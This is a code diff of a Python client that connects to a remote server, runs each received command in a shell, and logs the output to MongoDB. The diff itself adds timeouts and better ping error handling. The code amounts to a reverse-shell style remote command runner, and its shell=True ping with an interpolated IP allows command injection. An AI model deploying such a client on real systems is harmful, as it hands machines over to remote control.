@@ -10,20 +10,23 @@ import threading
 
 conn = True
 
+
 def test_connection(ip):
     while True:
         time.sleep(2)
-        try:
-            ping_out = subprocess.check_output(f'ping -c 5 {ip}', shell=True)
-        except:
-            ping_out = subprocess.check_output(f"ping {ip}", shell=True)
 
-        if ping_out:
-            return True
-        else:
+        try:
+            try:
+                subprocess.check_output(f'ping -c 5 {ip}', shell=True)
+            except:
+                subprocess.check_output(f"ping {ip}", shell=True)
+
+        except subprocess.CalledProcessError:
+
             global conn
             conn = False
             return
+
 
 def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:27017/"):
     """
@@ -39,8 +42,6 @@ def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:2701
 
     subprocess is a library to deal with the operating system to implement and get any output
     """
-    global conn
-    conn = True
 
     while conn:
         try:
@@ -52,6 +53,7 @@ def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:2701
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
+            print("Found Server")
         except:
             break
         connection = threading.Thread(target=test_connection, args=(ip,))
@@ -64,7 +66,13 @@ def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:2701
             full_msg = b''
             new_msg = True
             while True:
-                msg = s.recv(5)
+                try:
+                    s.settimeout(60)
+                    msg = s.recv(5)
+                except:
+                    s.close()
+                    return
+
                 count += 1
                 if len(msg) <= 0:
                     break
@@ -82,9 +90,9 @@ def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:2701
                         print(do_command.decode())
                         try:
                             if len(do_command.decode()) >= 1:
-                                to_db = mycol.insert_one({"data": f"{subprocess.check_output(msg_got, shell=True).decode()}", "code": 0})
+                                mycol.insert_one({"data": f"{subprocess.check_output(msg_got, shell=True).decode()}", "code": 0})
                             else:
-                                to_db = mycol.insert_one({"data": "command has no shown value", "code": 0})
+                                mycol.insert_one({"data": "command has no shown value", "code": 0})
                         except:
                             pass
                     except:
@@ -97,7 +105,6 @@ def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:2701
                     break
 
     return
-
 
 
 # while loop used with time , as to handle the error of internet connections to try to run the function
